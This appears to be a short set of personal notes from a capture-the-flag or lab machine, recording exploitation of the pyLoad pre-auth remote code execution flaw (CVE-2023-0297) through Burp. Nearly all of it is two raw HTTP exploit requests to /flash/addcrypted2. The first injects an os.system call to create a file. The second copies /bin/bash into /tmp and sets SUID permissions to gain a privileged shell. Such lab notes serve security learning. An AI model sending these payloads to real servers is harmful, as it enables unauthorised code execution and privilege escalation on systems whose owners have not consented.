opened the page 10.10.11.214:8000 in firefox and caught request with burp

![[burp21.png]]

not really nessesary though since I made a new burp repeater tab

Tried cvs payload
https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad

```sh
POST /flash/addcrypted2 HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

jk=pyimport%20os;os.system("touch%20/tmp/pwnd");f=function%20f2(){};&package=xxx&crypted=AAAA&&pas
```

![[burp22.png]]

file created


Changed to this:

```sh
POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

jk=pyimport%20os;os.system("cp /bin/bash /tmp/fixit42; chmod +u=sx /tmp/fixit42");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa
```

![[burp23.png]]

